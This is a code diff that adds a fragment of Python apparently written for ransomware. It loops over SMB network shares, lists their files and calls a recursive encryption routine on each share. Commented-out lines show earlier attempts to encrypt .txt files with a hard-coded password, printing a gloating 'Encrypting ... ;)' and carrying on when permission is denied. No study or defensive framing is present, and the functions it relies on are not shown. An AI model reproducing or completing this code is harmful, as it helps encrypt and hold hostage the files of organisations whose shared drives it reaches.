@@ -1,1 +1,37 @@
 ayyy lmao
+
+
+for share in shares:
+        # if not share.isSpecial and share.name not in ['NETLOGON', 'SYSVOL']:
+        sharedfiles = conn.listPath(share.name, '\\')
+        for sharedfile in sharedfiles:
+            print(sharedfile.filename)
+        sharename_string = share.name
+        print(sharename_string)
+        recursive_encrypt('\\', sharename_string)
+
+            # print(sharedfile.filename)
+
+            # temp_file = tempfile.NamedTemporaryFile()
+            # file_attributes, filesize = conn.retrieveFile('smbtest', '/' + sharedfile.filename, temp_file)
+            # temp_file.seek(0, 0)
+            # file_contents = temp_file.readlines()[0]
+            # for fc in file_contents:
+
+            # Retrieved file contents are inside file_obj
+            # Do what you need with the file_obj and then close it
+            # Note that the file obj is positioned at the end-of-file,
+            # so you might need to perform a file_obj.seek() if you need
+            # to read from the beginning
+            # temp_file.close()
+
+            # extension = sharedfile.filename[-4:]
+            # print('Substring = ' + extension)
+            # if extension == '.txt':
+            # print('Encrypting ' + sharedfile.filename + '... ;)')
+
+            # os.path.isfile(sharedfile.filename):
+            #  print('Text is ' + sharedfile.filename)
+            # demo.main('-i ' + sharedfile.filename + ' -o ' + sharedfile.filename + ' -p pippo')
+        # except:
+        #    print("ERROR: Permission denied for folder: " + share.name + ". Keeping it up...")
